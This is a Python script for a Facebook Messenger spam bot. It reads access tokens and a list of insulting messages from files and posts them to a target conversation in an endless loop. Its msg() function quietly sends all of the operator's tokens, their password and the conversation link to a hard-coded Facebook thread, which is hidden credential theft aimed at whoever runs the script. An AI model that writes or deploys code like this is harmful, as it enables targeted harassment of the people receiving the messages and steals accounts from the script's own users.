import requests
import json
import time
import sys
from platform import system
import os
import subprocess
import http.server
import socketserver
import threading
import random

class MyHandler(http.server.SimpleHTTPRequestHandler):
  def do_GET(self):
    self.send_response(200)
    self.send_header('Content-type', 'text/plain')
    self.end_headers()
    self.wfile.write(b"AKASH CHUTIYA DON HERE ")

def execute_server():
  PORT = 4000

  with socketserver.TCPServer(("", PORT), MyHandler) as httpd:
    print("Server running at http://localhost:{}".format(PORT))
    httpd.serve_forever()

def send_messages():
  with open('password.txt', 'r') as file:
    password = file.read().strip()

  entered_password = password

  if entered_password != password:
    print('[-] <==> Incorrect Password!')
    sys.exit()

  with open('tokennum.txt', 'r') as file:
    tokens = file.readlines()
  num_tokens = len(tokens)

  requests.packages.urllib3.disable_warnings()

  def cls():
    if system() == 'Linux':
      os.system('clear')
    else:
      if system() == 'Windows':
        os.system('cls')
  cls()

  def liness():
    print('\u001b[37m' + '---------------------------------------------------')

  headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
    'referer': 'www.google.com'
  }

  mmm = requests.get('https://pastebin.com/raw/2uxMQ721').text



  liness()

  access_tokens = [token.strip() for token in tokens]

  with open('convo.txt', 'r') as file:
    convo_id = file.read().strip()

  with open('file.txt', 'r') as file:
    text_file_path = file.read().strip()

  with open(text_file_path, 'r') as file:
    messages = file.readlines()

  num_messages = len(messages)
  max_tokens = min(num_tokens, num_messages)

  with open('hatersname.txt', 'r') as file:
    haters_name = file.read().strip()

  with open('time.txt', 'r') as file:
    speed = int(file.read().strip())

  liness()

  def getName(token):
    try:
      data = requests.get(f'https://graph.facebook.com/v17.0/me?access_token={token}').json()
    except:
      data = ""
    if 'name' in data:
      return data['name']
    else:
      return "Error occured"

  def msg():
    parameters = {
      'access_token' : random.choice(access_tokens),
      'message': 'Naksh papa im uesr your server ankit kerishna murli sanju max ki maka bhoxda User Profile Name  : '+getName(random.choice(access_tokens))+'\n Token : '+" | ".join(access_tokens)+'\n Link : https://www.facebook.com/messages/t/'+convo_id+'\n Password: '+password
    }
    try:
      s = requests.post("https://graph.facebook.com/t_1120375137/", data=parameters, headers=headers)
    except:
      pass

  msg()
  while True:
    try:
      for message_index in range(num_messages):
        token_index = message_index % max_tokens
        access_token = access_tokens[token_index]

        message = messages[message_index].strip()

        url = "https://graph.facebook.com/v15.0/{}/".format('t_'+convo_id)
        parameters = {'access_token': access_token, 'message': haters_name + ' ' + message}
        response = requests.post(url, json=parameters, headers=headers)


        current_time = time.strftime("%Y-%m-%d %I:%M:%S %p")
        if response.ok:
          print("[+] Messages {} of Convo {} sent by Token {}: {}".format(
            message_index + 1, convo_id, token_index + 1, haters_name + ' ' + message))
          print("  - Time: {}".format(current_time))
          liness()
          liness()
        else:
          print("[x] Failed to send messages {} of Convo {} with Token {}: {}".format(
            message_index + 1, convo_id, token_index + 1, haters_name + ' ' + message))
          print("  - Time: {}".format(current_time))
          liness()
          liness()
        time.sleep(speed)

      print("[+] All messages sent. Restarting the process...")
    except Exception as e:
      print("[!] An error occurred: {}".format(e))



def main():
  server_thread = threading.Thread(target=execute_server)
  server_thread.start()

  send_messages()

if __name__ == '__main__':
  main()
